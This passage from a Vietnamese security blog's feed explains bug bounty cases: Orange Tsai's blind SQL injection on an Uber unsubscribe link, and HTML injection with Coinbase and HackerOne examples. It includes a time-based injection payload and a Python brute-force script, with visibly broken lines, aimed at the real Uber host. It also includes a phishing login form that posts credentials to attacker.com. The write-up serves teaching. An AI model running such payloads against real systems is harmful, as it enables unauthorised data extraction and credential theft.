&lt;/ul&gt;
&lt;h3 id=&#34;3-uber-blind-sqli&#34;&gt;3. Uber Blind SQLi&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Ngoài các trang web, việc SQL Injection có thể đạt được thông qua các chỗ khác như liên kết email. Vào tháng 7 năm 2016, Orange Tsai đã nhận được một quảng cáo email từ Uber. Anh ấy nhận thấy rằng liên kết hủy đăng ký bao gồm một chuỗi được mã hóa base64 làm tham số URL. Liên kết trông giống như:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=eyJ1c2VyX2lkIjogIjU3NTUiLCAi\
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cmVjZWl2ZXIiOiAib3JhbmdlQG15bWFpbCJ9
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Decode đoạn &lt;code&gt;eyJ1c2VyX2lkIjogIjU3NTUiLCAi&lt;/code&gt;, sử dụng base64 trả về chuỗi JSON&lt;code&gt;{&amp;quot;user_id&amp;quot;: &amp;quot;5755&amp;quot;, &amp;quot;receiver&amp;quot;: &amp;quot;orange@mymail&amp;quot;}&lt;/code&gt;. Sau khi có chuỗi giải mã, anh ta thêm &lt;code&gt;and sleep(12)=1&lt;/code&gt; vào tham số URL được mã hóa, đây là một phép injection vô hại được thiết kế để làm cho CSDL mất nhiều thời gian hơn để đáp ứng với hành động hủy đăng ký &lt;code&gt;{&amp;quot;user_id&amp;quot;: &amp;quot;5755 and sleep(12)=1&amp;quot;, &amp;quot;receiver&amp;quot;: &amp;quot;orange@mymail&amp;quot;}&lt;/code&gt;. Nếu một trang web dễ bị vulnerrable, việc thực hiện truy vấn sẽ đánh giá sleep(12) và không thực hiện hành động nào trong 12 giây trước khi so sánh dầu ra của lệnh sleep với 1. Trong MySQL, lệnh sleep thường trả về 0, do đó việc so sánh này sẽ thất bại, nhưng điều này không quan trọng vì việc thực thi sẽ mất ít nhất 12 giây.&lt;/li&gt;
&lt;li&gt;Sau khi Orange mã hóa lại payload đã sửa đổi và chuyển payload đó sang tham số URL, anh ta đã truy cập liên kết hủy đăng ký để xác nhận phản hồi HTTP mất ít nhất 12 giây. Tuy nhiên Orangeddax quyết định rằng anh ta cần thêm bằng chứng cụ thể về SQLi để gửi cho Uber, vì vậy anh ta đã quyết định kết xuất username, hostname, và name of the database bằng cách sử dụng brute force vì nó thể hiện khả năng trích xuất thông tin từ SQLi mà không cần truy cập dữ liệu bí mật.&lt;/li&gt;
&lt;li&gt;SQL có một hàm called user trả về username và tên máy chủ của CSDL ở dạng &lt;code&gt;&amp;lt;user&amp;gt;@&amp;lt;host&amp;gt;&lt;/code&gt;. Bởi vì Orange không thể truy cập đầu ra từ các truy vấn được injecion của mình, anh ta không thể gọi cho người dùng. Thay vào đó, Oarange đã sửa đổi truy vấn của mình để thêm kiểm tra có điều kiện khi truy vấn tra cứu ID người dùng của anh ta. So sánh một ký tự của tên người dùng CSDL và chuỗi tên máy chủ tại một thời điểm bằng cách sử dụng hàm &lt;code&gt;mid&lt;/code&gt;. Tương tự như SQLi của Yahoo Sports từ báo cáo lỗi trước đó. Orange đã sử dụng một câu lệnh so sánh để lấy từng ký tự của tên người dùng và chuỗi tên máy chủ. Ví dụ: để tìm tên người dùng và tên máy chủ bằng cách sử dụng câu lệnh so sánh và sức mạnh của brute force, Orange đã lấy ký tự đầu tiên của giá trị được trả về từ người dùng bằng cách sử dụng hàm &lt;code&gt;mid&lt;/code&gt; và đem so sánh xem ký tự đó có bằng &lt;code&gt;&#39;a&#39;&lt;/code&gt; không, sau đó đến &lt;code&gt;&#39;b&#39;&lt;/code&gt; rồi &lt;code&gt;&#39;c&#39;&lt;/code&gt;,.. Nếu câu lệnh so sánh là đúng, máy chủ sẽ thực thi lệnh hủy đăng ký cho biết rằng ký tự đàu tiên của giá trị trả về của hàm user bằng với ký tự mà nó được so sánh. Mặt khác, nếu sai thì máy chủ sẽ không hủy đăng ký của anh ta. Bằng cách kiểm tra từng ký tự của hàm user. Giá trị trả về bằng phương thức này, Orange cuối cùng sẽ có thể lấy được toàn bộ tên người dùng và tên máy chủ.
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;mport&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;string&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;urllib&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;quote&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b64encode&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;digits&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;letters&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;_-@.&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;user_id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5755&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;receiver&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;blog.orange.tw&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;l&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;5755 and mid(user(),&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;,1)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%c&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;#&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;new_payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dumps&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;new_payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b64encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;quote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new_payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Đây là một đoạn code viết bằng python giúp Orange lấy được tên người dùng và tên máy chủ.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;SQLi có thể là một lỗ hổng nguy hiểm cho một trang web. Nếu kẻ tấn công tìm thấy SQLi, chúng có thể có được full quyền cho một trang web. Trong một số trường hợp, SQLi có thể được leo thang bằng cách chèn dữ liệu vào CSDL cho phép quyền quản trị tren trang web, như trong ví dụ về Drupal. Khi tìm kiếm các lỗ hổng SQLi, hãy chú ý đến những nơi mà bạn có thể chuyển các giấu ngoặc đơn hoặc dấu ngược kép không được giải mã cho một truy vấn. Khi bạn tìm thấy một lỗ hổng, các dấu hiệu cho thấy lỗ hổng đó tồn tại có thể là một hint, chẳng hạn như blind injection. Bạn cũng nên tìm những nơi mà bạn có thể truyền dữ liệu đến một trang web theo những cách không mong muốn, chẳng hạn như những nơi bạn có thể thay thế các tham số mảng trong dữ liệu yêu cầu như trong lỗi của Uber.&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Phần 5: HTML Injection</title>
      <link>https://minhtuanact.github.io/posts/phan-5-html-injection/</link>
      <pubDate>Wed, 29 May 2019 10:34:02 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/phan-5-html-injection/</guid>
      <description>&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Hypertext Markup Language (HTML) injection đôi khi cũng hơi ảo ảo =)). Đây thực sự là một cuộc tấn công được thực hiện bởi một website cho phép người dùng inject HTML vào các trang web của mình bằng cái kiểu mà không giống người dùng bình thường nhập dữ liệu. Nói cách khác, HTML Injection được gây ra bởi việc nhận HTML. Thông thường, thông qua một số hình thức nhập, sau đó được hiện thị dưới dạng input form trên trang web. Điều này khác biệt với Javascript, VBScript, &amp;hellip;, có thể dẫn đến Cross Site Scripting Attacks. Vì HTML là ngôn ngữ được sử dụng để xác định cấu trúc của một website, nếu Attacker có thể HTML Injection, về cơ bản chúng có thể thay đổi giao diện của trình duyệt và của trang web đó. Đôi khi, điều này có thể dẫn đến thay đổi hoàn toàn giao diện của trang hoặc trong các trường hợp khác, tạo HTML forms để lừa người dùng với hy vọng họ sử dụng form để gửi thông tin nhạy cảm (Có thể được gọi là lừa đảo). Ví dụ: Nếu bạn có thể HTML Injection, bạn có thể thêm thẻ &lt;form&gt; vào trang, yêu cầu người dùng nhập lại tên người dùng và mật khẩu của họ như:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;http://attacker.com/capture.php&amp;#39;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;login-form&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;text&amp;#39;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;submit&amp;#39;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Tuy nhiên, khi gửi form này, thông tin thực sự sẽ được gửi đến &lt;code&gt;http://attacker.com/&lt;/code&gt; thông qua thuộc tính &lt;code&gt;action&lt;/code&gt;, nó sẽ gửi thông tin đến trang web của Attacker.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;examples&#34;&gt;Examples&lt;/h2&gt;
&lt;h3 id=&#34;1-coinbase-comments&#34;&gt;1. Coinbase Comments&lt;/h3&gt;
&lt;h4 id=&#34;description-1&#34;&gt;Description&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Đối với lỗ hổng này, reporter đã xác định rằng Coinbase đang giải mã các giá trị được mã hóa URI khi render văn bản. Thông thường các kí tự trong URI không được bảo vệ. Khi một ký tự được mã hóa URI, nó được chuyển đổi thành giá trị byte trong bảng mã ASCII và trước dấu %. Vì vậy, / trở thành %2F, &amp;amp; trở thành %26. Bên cạnh đó, ASCII là một loại mã phổ biến nhất trên internet cho đến khi UTF-8 xuất hiện. Chúng ta cùng đến một ví dụ về loại tấn công này nhé.
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;h1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;This is a test&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;h1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;* Coinbase sẽ hiển thị dưới dạng văn bản thuần túy, chính xác như bạn thấy ở bên trên. Nhưng người dùng gửi đi những ký tự được mã hóa thì sẽ trở thành 
    ```html
    %3C%68%31%3E%54%68%69%73%20%69%73%20%61%20%74%65%73%74%3C%2F%68%31%3E
    ```
* Coinbase sẽ giải mã chuỗi đó và hiển thị dưới dạng 
              &amp;lt;h1&amp;gt;This is a test&amp;lt;/h1&amp;gt;
* Bạn đọc có thể xem video này để hiểu rõ hơn về kiểu tấn công này.
  &amp;gt; [HTML Injection in apps user review](https://www.dropbox.com/s/360cytluyiw2ym9/HTMLI.mp4?dl=0)
* Khi bạn kiểm tra một trang web, hãy kiểm tra xem nó được xử lý các loại đầu vào khác nhau nào, bao gồm văn bản thuần túy và văn bản được mã hóa. Hãy hết sức cảnh giác với các trang web chấp nhận các giá trị được mã hóa URI và hiển thị được decoded values. Bạn đọc có thể sử dụng công cụ [CyberChef](https://gchq.github.io/CyberChef) để mã hóa và giải mã URI. Tôi nghĩ rằng bạn sẽ rất thích nó đấy ^^.
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;2-hackerone-unintended-html-inclusion&#34;&gt;2. HackerOne Unintended HTML Inclusion&lt;/h3&gt;
&lt;h4 id=&#34;description-2&#34;&gt;Description:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Về vấn đề này, chúng ta sẽ cho một ví dụ luôn nhé.
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[test](http://www.torontowebsitedeveloper.com &amp;#34;test ismap=&amp;#34;yes&amp;#34;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;Trình soạn thảo HTML sẽ lấy đoạn ở trên và biến thành
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
